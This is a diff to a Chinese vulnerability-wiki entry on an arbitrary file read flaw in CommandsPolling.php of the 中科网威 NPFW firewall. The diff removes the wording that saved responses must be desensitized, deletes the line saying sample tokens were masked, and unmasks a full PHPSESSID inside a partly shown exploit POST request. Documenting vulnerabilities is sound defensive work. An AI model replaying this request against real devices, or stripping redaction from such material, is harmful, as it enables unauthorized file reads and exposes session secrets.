@@ -17,7 +17,7 @@ referenced_identifiers: ""
 prerequisites: "含PHPSESSID，版本未列"
 archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-NPFW%E9%98%B2%E7%81%AB%E5%A2%99-CommandsPolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
 review_date: "2026-10-02"
-side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
+side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
 source_status: "unknown"
 canonical: "Web安全/安全设备/中科网威/中科网威-NPFW防火墙-CommandsPolling.php-任意文件读取漏洞.md"
 ---
@@ -36,11 +36,10 @@ canonical: "Web安全/安全设备/中科网威/中科网威-NPFW防火墙-Comma
 
 - 会话角色/匿名性未说明，filename任意读范围仅图证
 - 影响版本只有产品名，缺厂商补丁来源
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
-- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露
+- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露
 
 ### 待核与来源
 
@@ -78,7 +77,7 @@ canonical: "Web安全/安全设备/中科网威/中科网威-NPFW防火墙-Comma
 ```php
 POST /direct/polling/CommandsPolling.php HTTP/1.1
 Host: 
-Cookie: PHPSESSID=014**************************f9f
+Cookie: PHPSESSID=014d2705856e1df139772db42ccbaf9f
 Content-Length: 47
 Cache-Control: max-age=0
 Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
